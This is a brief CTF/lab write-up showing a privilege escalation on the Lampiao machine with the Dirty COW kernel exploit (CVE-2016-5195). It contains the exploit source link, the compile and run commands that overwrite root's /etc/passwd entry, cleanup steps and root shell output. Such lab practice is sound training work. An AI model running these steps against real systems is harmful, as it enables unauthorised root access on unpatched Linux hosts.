# 6 privesc KE

```
www-data@lampiao:/tmp$ uname -a
Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux

# tried firefart - broke shell but working
# trying another /etc/passwd one
# using the cpp /etc/passwd one

https://github.com/gbonacini/CVE-2016-5195

# compile
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil

./dcow -s
Running ...
Password overridden to: dirtyCowFun

Received su prompt (Password: )

echo 0 > /proc/sys/vm/dirty_writeback_centisecs
\cp /tmp/.ssh_bak /etc/passwd
\rm /tmp/.ssh_bak
root@lampiao:~# echo 0 > /proc/sys/vm/dirty_writeback_centisecs
root@lampiao:~# \cp /tmp/.ssh_bak /etc/passwd
root@lampiao:~# \rm /tmp/.ssh_bak

root@lampiao:~# whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root)
lampiao
ls
ls
```
